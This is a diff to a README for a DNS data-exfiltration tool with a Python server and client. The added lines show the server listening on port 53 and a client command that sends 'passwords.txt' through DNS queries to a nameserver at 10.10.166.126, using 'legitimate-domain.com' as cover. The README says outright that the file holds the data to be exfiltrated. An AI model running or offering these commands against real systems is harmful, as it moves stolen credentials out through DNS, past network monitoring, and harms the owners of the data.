@@ -30,7 +30,11 @@ You can install the required Python packages using pip:
 python3 ./server.py -o output.txt
 ```
 
-The server will start listening on port 5053 for incoming DNS queries.
+```sh
+python3 ./server.py -o output.txt -p 53
+```
+
+The server will start listening on port `53` for incoming DNS queries.
 
 #### Running the DNS Client
 
@@ -42,7 +46,11 @@ Here's an example of how to run the client script:
 python3 ./client.py -d "google.com" -f "passwords.txt"
 ```
 
-In this example, `google.com` is the domain to which the DNS queries will be sent, and `passwords` is the file containing the data to be exfiltrated.
+```sh
+python3 client.py -d legitimate-domain.com -f passwords.txt -p 53 --nameserver 10.10.166.126
+```
+
+In this example, `legitimate-domain.com` is the domain to which the DNS queries will be sent, and `passwords` is the file containing the data to be exfiltrated.
 
 ![](https://i.imgur.com/f2D0Z7p.png)
 
